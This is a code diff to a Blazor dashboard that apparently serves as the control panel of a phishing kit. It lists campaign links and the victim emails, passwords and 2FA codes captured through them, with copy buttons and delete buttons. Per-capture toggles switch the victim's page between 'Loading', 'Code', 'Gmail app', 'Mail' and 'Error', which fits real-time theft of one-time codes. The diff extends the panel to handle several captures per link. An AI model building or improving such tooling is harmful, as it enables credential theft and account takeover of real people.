@@ -146,9 +146,8 @@
                             @for (int i = 0; i < _links.Count; i++)
                             {
                                 var link = _links[i];
-                                var log  = link.LoginLogs.FirstOrDefault();
                                 var idx  = i;
-                                <tr class="@(link.IsLocked ? "cl-row-captured" : "")">
+                                <tr class="@(link.LoginLogs.Any() ? "cl-row-captured" : "")">
 
                                     <td class="num">@(idx + 1)</td>
 
@@ -157,9 +156,9 @@
                                     </td>
 
                                     <td class="cl-status-cell">
-                                        @if (link.IsLocked)
+                                        @if (link.LoginLogs.Any())
                                         {
-                                            <span class="link-badge badge-captured">Captured</span>
+                                            <span class="link-badge badge-multi-count">@link.LoginLogs.Count ×</span>
                                         }
                                         else if (link.IsVisited)
                                         {
@@ -180,59 +179,10 @@
                                         </button>
                                     </td>
 
-                                    <td class="email">
-                                        @if (log is not null)
-                                        {
-                                            <span class="cell-val">@log.Email</span>
-                                            <button class="copy-btn"
-                                                    @onclick="@(() => Copy(log.Email, $"email-{idx}"))"
-                                                    title="Copy">
-                                                <span class="material-icons">@(_copied == $"email-{idx}" ? "check" : "content_copy")</span>
-                                            </button>
-                                        }
-                                        else { <span class="cl-empty">—</span> }
-                                    </td>
-
-                                    <td class="password">
-                                        @if (log is not null)
-                                        {
-                                            <span class="cell-val">@log.Password</span>
-                                            <button class="copy-btn"
-                                                    @onclick="@(() => Copy(log.Password, $"pass-{idx}"))"
-                                                    title="Copy">
-                                                <span class="material-icons">@(_copied == $"pass-{idx}" ? "check" : "content_copy")</span>
-                                            </button>
-                                        }
-                                        else { <span class="cl-empty">—</span> }
-                                    </td>
-
-                                    <td class="code">
-                                        @if (log is null) { <span class="cl-empty">—</span> }
-                                        else if (string.IsNullOrEmpty(log.Code)) { <span class="pending">pending…</span> }
-                                        else
-                                        {
-                                            <span class="cell-val">@log.Code</span>
-                                            <button class="copy-btn"
-                                                    @onclick="@(() => Copy(log.Code, $"code-{idx}"))"
-                                                    title="Copy">
-                                                <span class="material-icons">@(_copied == $"code-{idx}" ? "check" : "content_copy")</span>
-                                            </button>
-                                        }
-                                    </td>
-
-                                    <td class="cl-toggle-cell">
-                                        @if (link.IsLocked)
-                                        {
-                                            <div class="dash-radio-group" @key="@($"rg-{link.Id}-{link.PageMode}")">
-                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 0)" @onchange="@(() => SetPage(link, 0))" /><span>Loading</span></label>
-                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
-                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
-                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
-                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 4)" @onchange="@(() => SetPage(link, 4))" /><span>Error</span></label>
-                                            </div>
-                                        }
-                                        else { <span class="url-toggle-na">—</span> }
-                                    </td>
+                                    <td class="email"><span class="cl-empty">—</span></td>
+                                    <td class="password"><span class="cl-empty">—</span></td>
+                                    <td class="code"><span class="cl-empty">—</span></td>
+                                    <td class="cl-toggle-cell"><span class="url-toggle-na">—</span></td>
 
                                     <td class="time">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</td>
 
@@ -250,6 +200,60 @@
                                     </td>
 
                                 </tr>
+                                @foreach (var (log, logNum) in link.LoginLogs.OrderBy(l => l.Id).Select((l, j) => (l, j + 1)))
+                                {
+                                    <tr class="cl-log-subrow">
+                                        <td></td>
+                                        <td class="cl-log-subidx">↳ @logNum</td>
+                                        <td></td>
+                                        <td></td>
+                                        <td class="email">
+                                            <span class="cell-val">@log.Email</span>
+                                            <button class="copy-btn"
+                                                    @onclick="@(() => Copy(log.Email, $"email-{log.Id}"))"
+                                                    title="Copy">
+                                                <span class="material-icons">@(_copied == $"email-{log.Id}" ? "check" : "content_copy")</span>
+                                            </button>
+                                        </td>
+                                        <td class="password">
+                                            <span class="cell-val">@log.Password</span>
+                                            <button class="copy-btn"
+                                                    @onclick="@(() => Copy(log.Password, $"pass-{log.Id}"))"
+                                                    title="Copy">
+                                                <span class="material-icons">@(_copied == $"pass-{log.Id}" ? "check" : "content_copy")</span>
+                                            </button>
+                                        </td>
+                                        <td class="code">
+                                            @if (string.IsNullOrEmpty(log.Code)) { <span class="pending">pending…</span> }
+                                            else
+                                            {
+                                                <span class="cell-val">@log.Code</span>
+                                                <button class="copy-btn"
+                                                        @onclick="@(() => Copy(log.Code, $"code-{log.Id}"))"
+                                                        title="Copy">
+                                                    <span class="material-icons">@(_copied == $"code-{log.Id}" ? "check" : "content_copy")</span>
+                                                </button>
+                                            }
+                                        </td>
+                                        <td class="cl-toggle-cell">
+                                            <div class="dash-radio-group" @key="@($"rg-{log.Id}-{log.PageMode}")">
+                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 0)" @onchange="@(() => SetLogPage(log, 0))" /><span>Loading</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 1)" @onchange="@(() => SetLogPage(log, 1))" /><span>Code</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 2)" @onchange="@(() => SetLogPage(log, 2))" /><span>Gmail app</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 3)" @onchange="@(() => SetLogPage(log, 3))" /><span>Mail</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 4)" @onchange="@(() => SetLogPage(log, 4))" /><span>Error</span></label>
+                                            </div>
+                                        </td>
+                                        <td></td>
+                                        <td class="cl-actions-cell">
+                                            <button class="url-delete-btn"
+                                                    @onclick="@(() => DeleteLog(log.Id))"
+                                                    title="Delete this capture">
+                                                <span class="material-icons">delete</span>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                }
                             }
                         </tbody>
                     </table>
@@ -261,16 +265,15 @@
                 @for (int i = 0; i < _links.Count; i++)
                 {
                     var link = _links[i];
-                    var log  = link.LoginLogs.FirstOrDefault();
                     var idx  = i;
-                    <div class="dash-card @(link.IsLocked ? "dash-card-captured" : "")">
+                    <div class="dash-card @(link.LoginLogs.Any() ? "dash-card-captured" : "")">
 
                         <!-- slug + status + actions -->
                         <div class="dash-card-header">
                             <span class="dash-card-slug">/@link.Slug</span>
-                            @if (link.IsLocked)
+                            @if (link.LoginLogs.Any())
                             {
-                                <span class="link-badge badge-captured">Captured</span>
+                                <span class="link-badge badge-multi-count">@link.LoginLogs.Count ×</span>
                             }
                             else if (link.IsVisited)
                             {
@@ -296,54 +299,60 @@
                             </button>
                         </div>
 
-                        @if (log is not null)
-                        {
-                            <div class="dash-card-row">
-                                <span class="dash-card-label">Email</span>
-                                <span class="dash-card-val dash-card-email">@log.Email</span>
-                                <button class="copy-btn" @onclick="@(() => Copy(log.Email, $"memail-{idx}"))" title="Copy">
-                                    <span class="material-icons">@(_copied == $"memail-{idx}" ? "check" : "content_copy")</span>
-                                </button>
-                            </div>
-
-                            <div class="dash-card-row">
-                                <span class="dash-card-label">Password</span>
-                                <span class="dash-card-val dash-card-pass">@log.Password</span>
-                                <button class="copy-btn" @onclick="@(() => Copy(log.Password, $"mpass-{idx}"))" title="Copy">
-                                    <span class="material-icons">@(_copied == $"mpass-{idx}" ? "check" : "content_copy")</span>
-                                </button>
-                            </div>
-
-                            <div class="dash-card-row">
-                                <span class="dash-card-label">2FA</span>
-                                @if (string.IsNullOrEmpty(log.Code))
-                                {
-                                    <span class="pending">pending…</span>
-                                }
-                                else
-                                {
-                                    <span class="dash-card-val dash-card-code">@log.Code</span>
-                                    <button class="copy-btn" @onclick="@(() => Copy(log.Code, $"mcode-{idx}"))" title="Copy">
-                                        <span class="material-icons">@(_copied == $"mcode-{idx}" ? "check" : "content_copy")</span>
-                                    </button>
-                                }
-                            </div>
-                        }
-
-                        <!-- date + page-mode radios -->
                         <div class="dash-card-footer">
                             <span class="dash-card-date">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</span>
-                            @if (link.IsLocked)
-                            {
-                                <div class="dash-radio-group" @key="@($"mob-rg-{link.Id}-{link.PageMode}")">
-                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 0)" @onchange="@(() => SetPage(link, 0))" /><span>Loading</span></label>
-                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
-                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
-                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
-                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 4)" @onchange="@(() => SetPage(link, 4))" /><span>Error</span></label>
-                                </div>
-                            }
                         </div>
+
+                        @foreach (var (log, logNum) in link.LoginLogs.OrderBy(l => l.Id).Select((l, j) => (l, j + 1)))
+                        {
+                            <div class="dash-log-subcard">
+                                <div class="dash-log-subcard-header">
+                                    <span class="dash-log-subcard-num">Capture @logNum</span>
+                                    <button class="url-delete-btn"
+                                            @onclick="@(() => DeleteLog(log.Id))"
+                                            title="Delete this capture">
+                                        <span class="material-icons">delete</span>
+                                    </button>
+                                </div>
+                                <div class="dash-card-row">
+                                    <span class="dash-card-label">Email</span>
+                                    <span class="dash-card-val dash-card-email">@log.Email</span>
+                                    <button class="copy-btn" @onclick="@(() => Copy(log.Email, $"memail-{log.Id}"))" title="Copy">
+                                        <span class="material-icons">@(_copied == $"memail-{log.Id}" ? "check" : "content_copy")</span>
+                                    </button>
+                                </div>
+                                <div class="dash-card-row">
+                                    <span class="dash-card-label">Password</span>
+                                    <span class="dash-card-val dash-card-pass">@log.Password</span>
+                                    <button class="copy-btn" @onclick="@(() => Copy(log.Password, $"mpass-{log.Id}"))" title="Copy">
+                                        <span class="material-icons">@(_copied == $"mpass-{log.Id}" ? "check" : "content_copy")</span>
+                                    </button>
+                                </div>
+                                <div class="dash-card-row">
+                                    <span class="dash-card-label">2FA</span>
+                                    @if (string.IsNullOrEmpty(log.Code))
+                                    {
+                                        <span class="pending">pending…</span>
+                                    }
+                                    else
+                                    {
+                                        <span class="dash-card-val dash-card-code">@log.Code</span>
+                                        <button class="copy-btn" @onclick="@(() => Copy(log.Code, $"mcode-{log.Id}"))" title="Copy">
+                                            <span class="material-icons">@(_copied == $"mcode-{log.Id}" ? "check" : "content_copy")</span>
+                                        </button>
+                                    }
+                                </div>
+                                <div class="dash-card-footer">
+                                    <div class="dash-radio-group" @key="@($"mob-rg-{log.Id}-{log.PageMode}")">
+                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 0)" @onchange="@(() => SetLogPage(log, 0))" /><span>Loading</span></label>
+                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 1)" @onchange="@(() => SetLogPage(log, 1))" /><span>Code</span></label>
+                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 2)" @onchange="@(() => SetLogPage(log, 2))" /><span>Gmail app</span></label>
+                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 3)" @onchange="@(() => SetLogPage(log, 3))" /><span>Mail</span></label>
+                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 4)" @onchange="@(() => SetLogPage(log, 4))" /><span>Error</span></label>
+                                    </div>
+                                </div>
+                            </div>
+                        }
 
                     </div>
                 }
@@ -363,7 +372,7 @@
     private string _newSlug     = string.Empty;
     private string _createError = string.Empty;
 
-    private int _captured => _links.Count(l => l.IsLocked);
+    private int _captured => _links.Sum(l => l.LoginLogs.Count);
 
     protected override async Task OnInitializedAsync()
     {
@@ -422,10 +431,16 @@
         _links = await CampaignService.GetAllAsync();
     }
 
-    private async Task SetPage(CampaignLink link, int pageMode)
+    private async Task SetLogPage(LoginLog log, int pageMode)
     {
-        await CampaignService.SetPageModeAsync(link.Id, pageMode, AppState);
-        link.PageMode = pageMode;
+        await LogService.SetLogPageModeAsync(log.Id, pageMode, AppState);
+        log.PageMode = pageMode;
+    }
+
+    private async Task DeleteLog(int logId)
+    {
+        await LogService.DeleteLogAsync(logId);
+        _links = await CampaignService.GetAllAsync();
     }
 
     private async Task Copy(string value, string key)
